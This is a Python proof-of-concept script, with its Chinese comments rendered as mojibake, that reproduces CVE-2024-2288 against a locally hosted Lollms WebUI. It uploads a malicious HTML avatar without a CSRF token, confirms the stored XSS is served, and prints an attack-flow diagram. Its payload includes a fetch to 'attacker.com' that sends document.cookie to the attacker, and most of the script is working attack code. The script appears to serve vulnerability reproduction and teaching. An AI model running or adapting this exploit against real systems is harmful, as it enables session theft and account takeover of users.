#!/usr/bin/env python3
"""
CVE-2024-2288 å¯è§†åŒ–æ”»å‡»æ¼”ç¤º
ä½¿ç”¨ Rich åº“åˆ›å»ºç»ˆç«¯å¯è§†åŒ–ç•Œé¢
"""
import requests
from io import BytesIO
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table
from rich.layout import Layout
from rich.live import Live
from rich.text import Text
from rich import box
import time

console = Console()
TARGET = "http://127.0.0.1:9600"

def print_header():
    """æ‰“å°æ ‡é¢˜"""
    title = Text()
    title.append("\nğŸ¯ CVE-2024-2288 ", style="bold red")
    title.append("CSRF + XSS æ”»å‡»é“¾å¯è§†åŒ–æ¼”ç¤º\n", style="bold yellow")
    
    console.print(Panel(
        title,
        box=box.DOUBLE,
        border_style="cyan",
        subtitle="Lollms WebUI â‰¤ 9.2 | CVSS 8.8 (é«˜å±)"
    ))

def create_status_table(stage, status, details):
    """åˆ›å»ºçŠ¶æ€è¡¨æ ¼"""
    table = Table(show_header=True, header_style="bold magenta", box=box.ROUNDED)
    table.add_column("é˜¶æ®µ", style="cyan", width=20)
    table.add_column("çŠ¶æ€", width=10)
    table.add_column("è¯¦ç»†ä¿¡æ¯", style="white")
    
    stages = [
        ("ğŸ” 1. ä¾¦å¯Ÿ", "â¸ï¸", "æ£€æŸ¥ç›®æ ‡æœåŠ¡å™¨"),
        ("ğŸš€ 2. CSRF æ”»å‡»", "â¸ï¸", "ä¸Šä¼ æ¶æ„æ–‡ä»¶"),
        ("âœ… 3. éªŒè¯ä¸Šä¼ ", "â¸ï¸", "ç¡®è®¤æ–‡ä»¶å¯è®¿é—®"),
        ("ğŸ’¥ 4. XSS è§¦å‘", "â¸ï¸", "æ‰§è¡Œæ¶æ„ä»£ç "),
    ]
    
    for i, (name, default_status, desc) in enumerate(stages, 1):
        if i < stage:
            current_status = "âœ…"
            current_style = "green"
        elif i == stage:
            current_status = status
            current_style = "yellow" if status == "âš™ï¸" else "green" if status == "âœ…" else "red"
            desc = details
        else:
            current_status = default_status
            current_style = "dim"
        
        table.add_row(name, current_status, desc, style=current_style)
    
    return table

def stage_1_reconnaissance():
    """é˜¶æ®µ 1: ä¾¦å¯Ÿ"""
    console.print("\n" + "="*70)
    console.print("[bold cyan]é˜¶æ®µ 1: ä¾¦å¯Ÿç›®æ ‡æœåŠ¡å™¨[/bold cyan]")
    console.print("="*70)
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:
        task = progress.add_task("[cyan]æ­£åœ¨æ¢æµ‹ç›®æ ‡...", total=None)
        
        try:
            resp = requests.get(f"{TARGET}/", timeout=5)
            progress.update(task, completed=True)
            
            # æ˜¾ç¤ºç»“æœ
            result = Table(show_header=False, box=box.SIMPLE)
            result.add_row("ğŸ¯ ç›®æ ‡åœ°å€", f"[yellow]{TARGET}[/yellow]")
            result.add_row("ğŸ“¡ HTTP çŠ¶æ€", f"[green]{resp.status_code} OK[/green]")
            result.add_row("ğŸ’¬ æœåŠ¡å™¨å“åº”", f"[cyan]{resp.json()}[/cyan]")
            result.add_row("âš ï¸  æ¼æ´çŠ¶æ€", "[red]æœªæ£€æµ‹åˆ° CSRF ä¿æŠ¤[/red]")
            
            console.print(Panel(result, title="[bold green]âœ… ä¾¦å¯ŸæˆåŠŸ[/bold green]", border_style="green"))
            return True
            
        except Exception as e:
            progress.update(task, completed=True)
            console.print(f"[red]âŒ è¿æ¥å¤±è´¥: {e}[/red]")
            return False

def stage_2_csrf_attack():
    """é˜¶æ®µ 2: CSRF æ”»å‡»"""
    console.print("\n" + "="*70)
    console.print("[bold yellow]é˜¶æ®µ 2: å‘èµ· CSRF æ”»å‡»[/bold yellow]")
    console.print("="*70)
    
    # æ˜¾ç¤º payload
    xss_payload = """<!DOCTYPE html>
<html>
<body>
    <h1>Innocent Page</h1>
    <script>
        // XSS: çªƒå– Cookie
        alert('XSS! Cookie: ' + document.cookie);
        fetch('http://attacker.com/steal?c=' + document.cookie);
    </script>
</body>
</html>"""
    
    console.print(Panel(
        f"[yellow]{xss_payload}[/yellow]",
        title="[bold red]ğŸ”¥ æ¶æ„ Payload[/bold red]",
        border_style="red",
        subtitle=f"å¤§å°: {len(xss_payload)} bytes"
    ))
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:
        task = progress.add_task("[yellow]æ­£åœ¨å‘é€ CSRF è¯·æ±‚...", total=None)
        
        try:
            files = {'avatar': ('malicious.html', BytesIO(xss_payload.encode()), 'text/html')}
            resp = requests.post(f"{TARGET}/upload_avatar", files=files, timeout=5)
            progress.update(task, completed=True)
            
            if resp.status_code == 200:
                result = resp.json()
                uploaded_file = result.get('message', '').split(': ')[1]
                
                info = Table(show_header=False, box=box.SIMPLE)
                info.add_row("ğŸ“¤ ä¸Šä¼ æ–¹æ³•", "[yellow]POST /upload_avatar[/yellow]")
                info.add_row("ğŸ“ æ–‡ä»¶å", f"[cyan]{uploaded_file}[/cyan]")
                info.add_row("âœ… æœåŠ¡å™¨å“åº”", f"[green]{result}[/green]")
                info.add_row("ğŸ”“ CSRF Token", "[red]æ—  (æ¼æ´å­˜åœ¨!)[/red]")
                
                console.print(Panel(info, title="[bold green]âœ… CSRF æ”»å‡»æˆåŠŸ[/bold green]", border_style="green"))
                return uploaded_file
                
        except Exception as e:
            progress.update(task, completed=True)
            console.print(f"[red]âŒ æ”»å‡»å¤±è´¥: {e}[/red]")
            return None

def stage_3_verify_upload(filename):
    """é˜¶æ®µ 3: éªŒè¯ä¸Šä¼ """
    console.print("\n" + "="*70)
    console.print("[bold green]é˜¶æ®µ 3: éªŒè¯æ–‡ä»¶ä¸Šä¼ [/bold green]")
    console.print("="*70)
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:
        task = progress.add_task("[green]æ­£åœ¨éªŒè¯æ–‡ä»¶å¯è®¿é—®æ€§...", total=None)
        
        try:
            file_url = f"{TARGET}/user_infos/{filename}"
            resp = requests.get(file_url, timeout=5)
            progress.update(task, completed=True)
            
            if resp.status_code == 200:
                has_script = '<script>' in resp.text
                
                info = Table(show_header=False, box=box.SIMPLE)
                info.add_row("ğŸ”— æ–‡ä»¶ URL", f"[cyan]{file_url}[/cyan]")
                info.add_row("ğŸ“Š HTTP çŠ¶æ€", f"[green]{resp.status_code} OK[/green]")
                info.add_row("ğŸ“„ Content-Type", f"[yellow]{resp.headers.get('content-type')}[/yellow]")
                info.add_row("ğŸ’¾ æ–‡ä»¶å¤§å°", f"[cyan]{len(resp.content)} bytes[/cyan]")
                
                if has_script:
                    info.add_row("ğŸ”¥ XSS Payload", "[red]âœ… å®Œæ•´ä¿ç•™ (æœªè¿‡æ»¤!)[/red]")
                
                console.print(Panel(info, title="[bold green]âœ… æ–‡ä»¶éªŒè¯æˆåŠŸ[/bold green]", border_style="green"))
                return True
                
        except Exception as e:
            progress.update(task, completed=True)
            console.print(f"[red]âŒ éªŒè¯å¤±è´¥: {e}[/red]")
            return False

def stage_4_impact_analysis():
    """é˜¶æ®µ 4: å½±å“åˆ†æ"""
    console.print("\n" + "="*70)
    console.print("[bold red]é˜¶æ®µ 4: æ”»å‡»å½±å“åˆ†æ[/bold red]")
    console.print("="*70)
    
    # æ”»å‡»æµç¨‹å›¾
    flow = Text()
    flow.append("\næ”»å‡»è€…\n", style="bold red")
    flow.append("   â”‚\n")
    flow.append("   â”œâ”€â–º ", style="dim")
    flow.append("åˆ›å»ºæ¶æ„ç½‘é¡µ (å«è‡ªåŠ¨æäº¤è¡¨å•)\n", style="yellow")
    flow.append("   â”‚\n")
    flow.append("   â–¼\n")
    flow.append("å—å®³è€…è®¿é—®æ¶æ„é¡µé¢\n", style="bold cyan")
    flow.append("   â”‚\n")
    flow.append("   â”œâ”€â–º ", style="dim")
    flow.append("æµè§ˆå™¨è‡ªåŠ¨å‘é€ CSRF è¯·æ±‚\n", style="yellow")
    flow.append("   â”‚\n")
    flow.append("   â–¼\n")
    flow.append("Lollms æœåŠ¡å™¨\n", style="bold green")
    flow.append("   â”‚\n")
    flow.append("   â”œâ”€â–º ", style="dim")
    flow.append("ä¿å­˜æ¶æ„ HTML åˆ° /user_infos/\n", style="yellow")
    flow.append("   â”‚\n")
    flow.append("   â–¼\n")
    flow.append("å—å®³è€…/å…¶ä»–ç”¨æˆ·è®¿é—®ä¸Šä¼ æ–‡ä»¶\n", style="bold cyan")
    flow.append("   â”‚\n")
    flow.append("   â”œâ”€â–º ", style="dim")
    flow.append("XSS è§¦å‘,Cookie è¢«çªƒå–\n", style="red")
    flow.append("   â”‚\n")
    flow.append("   â–¼\n")
    flow.append("ğŸ”“ ", style="red")
    flow.append("è´¦æˆ·æ¥ç®¡æˆåŠŸ!\n", style="bold red blink")
    
    console.print(Panel(flow, title="[bold red]ğŸ’¥ å®Œæ•´æ”»å‡»é“¾[/bold red]", border_style="red"))
    
    # æ¼æ´è¯¦æƒ…
    vuln_table = Table(show_header=True, header_style="bold red", box=box.ROUNDED)
    vuln_table.add_column("æ¼æ´ç‚¹", style="yellow", width=25)
    vuln_table.add_column("å½±å“", style="red")
    
    vuln_table.add_row(
        "âŒ æ—  CSRF Token éªŒè¯",
        "ä»»ä½•ç½‘ç«™éƒ½å¯ä»¥ä¼ªé€ ç”¨æˆ·è¯·æ±‚"
    )
    vuln_table.add_row(
        "âŒ æ—  Origin æ£€æŸ¥",
        "è·¨åŸŸæ”»å‡»æ— æ³•è¢«æ‹¦æˆª"
    )
    vuln_table.add_row(
        "âŒ æ— æ–‡ä»¶ç±»å‹ç™½åå•",
        "å¯ä¸Šä¼  HTML/JavaScript ç­‰å±é™©æ–‡ä»¶"
    )
    vuln_table.add_row(
        "âŒ ä¸Šä¼ æ–‡ä»¶ç›´æ¥å¯è®¿é—®",
        "æ—  CSP ä¿æŠ¤,XSS ç›´æ¥æ‰§è¡Œ"
    )
    vuln_table.add_row(
        "âŒ æ— æ–‡ä»¶åéšæœºåŒ–",
        "å¯é¢„æµ‹æ–‡ä»¶è·¯å¾„,æ˜“äºä¼ æ’­"
    )
    
    console.print("\n")
    console.print(vuln_table)

def show_summary():
    """æ˜¾ç¤ºæ€»ç»“"""
    console.print("\n" + "="*70)
    
    summary = Table(show_header=False, box=box.DOUBLE, border_style="cyan")
    summary.add_row("[bold cyan]CVE ç¼–å·[/bold cyan]", "[yellow]CVE-2024-2288[/yellow]")
    summary.add_row("[bold cyan]å½±å“ç‰ˆæœ¬[/bold cyan]", "[yellow]Lollms WebUI â‰¤ 9.2[/yellow]")
    summary.add_row("[bold cyan]æ¼æ´ç±»å‹[/bold cyan]", "[red]CSRF + å­˜å‚¨å‹ XSS[/red]")
    summary.add_row("[bold cyan]CVSS è¯„åˆ†[/bold cyan]", "[red bold]8.8 (é«˜å±)[/red bold]")
    summary.add_row("[bold cyan]CWE[/bold cyan]", "[yellow]CWE-352 (CSRF)[/yellow]")
    summary.add_row("[bold cyan]å¤ç°çŠ¶æ€[/bold cyan]", "[green bold]âœ… æˆåŠŸ[/green bold]")
    
    console.print(Panel(
        summary,
        title="[bold green]ğŸ‰ æ¼æ´å¤ç°å®Œæˆ[/bold green]",
        border_style="green"
    ))

def main():
    """ä¸»å‡½æ•°"""
    print_header()
    time.sleep(1)
    
    # é˜¶æ®µ 1: ä¾¦å¯Ÿ
    if not stage_1_reconnaissance():
        console.print("[red]âŒ ä¾¦å¯Ÿå¤±è´¥,ç»ˆæ­¢æ”»å‡»[/red]")
        return
    time.sleep(2)
    
    # é˜¶æ®µ 2: CSRF æ”»å‡»
    uploaded_file = stage_2_csrf_attack()
    if not uploaded_file:
        console.print("[red]âŒ CSRF æ”»å‡»å¤±è´¥,ç»ˆæ­¢æ”»å‡»[/red]")
        return
    time.sleep(2)
    
    # é˜¶æ®µ 3: éªŒè¯ä¸Šä¼ 
    if not stage_3_verify_upload(uploaded_file):
        console.print("[red]âŒ æ–‡ä»¶éªŒè¯å¤±è´¥,ç»ˆæ­¢æ”»å‡»[/red]")
        return
    time.sleep(2)
    
    # é˜¶æ®µ 4: å½±å“åˆ†æ
    stage_4_impact_analysis()
    time.sleep(1)
    
    # æ˜¾ç¤ºæ€»ç»“
    show_summary()
    
    console.print("\n[dim]æç¤º: åœ¨çœŸå®åœºæ™¯ä¸­,å—å®³è€…è®¿é—®æ¶æ„æ–‡ä»¶æ—¶ä¼šç«‹å³è§¦å‘ XSS[/dim]\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[yellow]âš ï¸  æ¼”ç¤ºè¢«ç”¨æˆ·ä¸­æ–­[/yellow]")
    except Exception as e:
        console.print(f"\n[red]âŒ é”™è¯¯: {e}[/red]")
